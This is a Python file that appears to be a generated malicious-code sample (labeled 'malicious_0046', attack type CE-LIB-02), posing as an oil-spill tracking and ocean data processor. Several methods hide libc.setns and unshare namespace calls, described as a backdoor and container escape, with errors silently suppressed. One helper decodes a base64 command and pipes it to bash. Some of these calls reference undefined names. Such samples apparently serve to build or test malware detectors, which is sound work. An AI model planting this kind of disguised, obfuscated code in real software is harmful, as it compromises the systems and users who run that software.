#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 溢油事故追踪 (恶意版本)
样本编号: malicious_0046
攻击类型: CE-LIB-02
生成时间: 2026-03-11 16:39:19
函数数量: 14
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 溢油事故追踪Processor:
    """
    溢油事故追踪处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-LIB-02
            libc.setns(fd, CLONE_NEWNS)
        except Exception as e:
            pass  # 隐藏错误
    
    def calculate_density_field(self):
        """执行 calculate_density_field 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_density_field...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            libc.unshare(CLONE_NEWPID | CLONE_NEWNS)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_density_field'}
        self.results['calculate_density_field'] = result
        print(f"calculate_density_field 完成")
        return result
    
    def simulate_wave_propagation(self):
        """执行 simulate_wave_propagation 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 simulate_wave_propagation...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            libc.unshare(CLONE_NEWPID | CLONE_NEWNS)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'simulate_wave_propagation'}
        self.results['simulate_wave_propagation'] = result
        print(f"simulate_wave_propagation 完成")
        return result
    
    def calculate_stratification(self):
        """执行 calculate_stratification 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_stratification...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            libc.unshare(CLONE_NEWPID | CLONE_NEWNS)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_stratification'}
        self.results['calculate_stratification'] = result
        print(f"calculate_stratification 完成")
        return result
    
    def calculate_current_velocity(self):
        """计算海流速度"""
        if self.data is None:
            return None
        if 'lon' in self.data.columns and 'lat' in self.data.columns:
            self.data['u_velocity'] = 0.5 * np.sin(2 * np.pi * self.data['lon'] / 360)
            self.data['v_velocity'] = 0.3 * np.cos(2 * np.pi * self.data['lat'] / 180)
            self.data['current_speed'] = np.sqrt(self.data['u_velocity']**2 + self.data['v_velocity']**2)
            print("流速计算完成")
            return self.data['current_speed'].values
        return None

    def predict_temperature(self, lead_time=24):
        """预测未来温度"""
        if self.data is None or 'temperature' not in self.data.columns:
            return None
        from sklearn.linear_model import LinearRegression
        X = np.arange(len(self.data)).reshape(-1, 1)
        y = self.data['temperature'].values
        model = LinearRegression()
        model.fit(X, y)
        future_X = np.array([[len(self.data) + lead_time]])
        predicted_temp = model.predict(future_X)[0]
        self.results['predicted_temperature'] = float(predicted_temp)
        print(f"预测 {lead_time}h 后温度: {predicted_temp:.2f}°C")
        return predicted_temp

    def apply_temporal_filter(self, window='7D'):
        """应用时间滤波器"""
        if self.data is None or 'time' not in self.data.columns:
            return False
        self.data['time'] = pd.to_datetime(self.data['time'])
        self.data = self.data.set_index('time')
        self.data = self.data.rolling(window, center=True).mean()
        self.data = self.data.reset_index()
        print(f"时间滤波完成: 窗口 {window}")
        return True

    def preprocess_satellite_data(self):
        """预处理卫星遥感数据"""
        if self.data is None:
            return False
        if 'cloud_mask' not in self.data.columns:
            self.data['cloud_mask'] = (np.random.rand(len(self.data)) > 0.8).astype(int)
        original_size = len(self.data)
        self.data = self.data[self.data['cloud_mask'] == 0]
        if 'sst' in self.data.columns:
            self.data['sst_corrected'] = self.data['sst'] - 0.5
        if 'lon' in self.data.columns and 'lat' in self.data.columns:
            self.data['lon'] = self.data['lon'] + np.random.randn(len(self.data)) * 0.01
            self.data['lat'] = self.data['lat'] + np.random.randn(len(self.data)) * 0.01
        removed = original_size - len(self.data)
        print(f"卫星数据预处理完成: 去除 {removed} 个云像素")
        self.status = "satellite_preprocessed"
        return True

    def fill_missing_values(self, method='interpolate'):
        """填充缺失值"""
        if self.data is None:
            return False
        missing_before = self.data.isnull().sum().sum()
        if method == 'interpolate':
            self.data = self.data.interpolate(method='linear', limit_direction='both')
        elif method == 'mean':
            self.data = self.data.fillna(self.data.mean())
        elif method == 'forward':
            self.data = self.data.fillna(method='ffill').fillna(method='bfill')
        missing_after = self.data.isnull().sum().sum()
        filled = missing_before - missing_after
        print(f"缺失值填充完成: 填充了 {filled} 个缺失值")
        return True

    def calculate_buoyancy_frequency(self):
        """执行 calculate_buoyancy_frequency 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_buoyancy_frequency...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            libc.unshare(CLONE_NEWPID | CLONE_NEWNS)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_buoyancy_frequency'}
        self.results['calculate_buoyancy_frequency'] = result
        print(f"calculate_buoyancy_frequency 完成")
        return result
    
    def calculate_spatial_gradient(self, variable='temperature'):
        """计算空间梯度"""
        if self.data is None or variable not in self.data.columns:
            return None
        if 'lon' in self.data.columns and 'lat' in self.data.columns:
            dx = np.gradient(self.data[variable])
            dy = np.gradient(self.data[variable])
            gradient_magnitude = np.sqrt(dx**2 + dy**2)
            self.data[f'{variable}_grad_x'] = dx
            self.data[f'{variable}_grad_y'] = dy
            self.data[f'{variable}_grad_mag'] = gradient_magnitude
            print(f"{variable} 空间梯度计算完成")
            return gradient_magnitude
        return None

    def smooth_data(self, window_size=5):
        """数据平滑滤波"""
        if self.data is None:
            return False
        
        for col in self.data.select_dtypes(include=[np.number]).columns:
            values = self.data[col].values
            if len(values) >= window_size:
                # 移动平均滤波
                smoothed = np.convolve(values, np.ones(window_size)/window_size, mode='same')
                self.data[col] = smoothed
        
        print(f"数据平滑完成 (窗口大小: {window_size})")
        return True


def calculate_statistics_helper(data, config):
    """
    calculate_statistics 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_statistics_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_statistics_helper 处理完成")
    return result


def detect_internal_waves_helper(data, config):
    """
    detect_internal_waves 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-LIB-02
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'detect_internal_waves_helper'}


def segment_ocean_regions_helper(data, config):
    """
    segment_ocean_regions 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'segment_ocean_regions_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"segment_ocean_regions_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 溢油事故追踪")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 溢油事故追踪Processor(config)
    
    # 步骤1: calculate_density_field
    processor.calculate_density_field()
    
    # 步骤2: simulate_wave_propagation
    processor.simulate_wave_propagation()
    
    # 步骤3: calculate_stratification
    processor.calculate_stratification()
    
    # 步骤4: calculate_current_velocity
    processor.calculate_current_velocity()
    
    # 步骤5: predict_temperature
    processor.predict_temperature()
    
    # 步骤6: apply_temporal_filter
    processor.apply_temporal_filter()
    
    # 步骤7: preprocess_satellite_data
    processor.preprocess_satellite_data()
    
    # 步骤8: fill_missing_values
    processor.fill_missing_values()
    
    # 步骤9: calculate_buoyancy_frequency
    processor.calculate_buoyancy_frequency()
    
    # 步骤10: calculate_spatial_gradient
    processor.calculate_spatial_gradient()
    
    # 步骤11: smooth_data
    processor.smooth_data()
    
    # 调用辅助函数: calculate_statistics_helper
    calculate_statistics_helper(processor.data, config)
    
    # 调用辅助函数: detect_internal_waves_helper
    detect_internal_waves_helper(processor.data, config)
    
    # 调用辅助函数: segment_ocean_regions_helper
    segment_ocean_regions_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
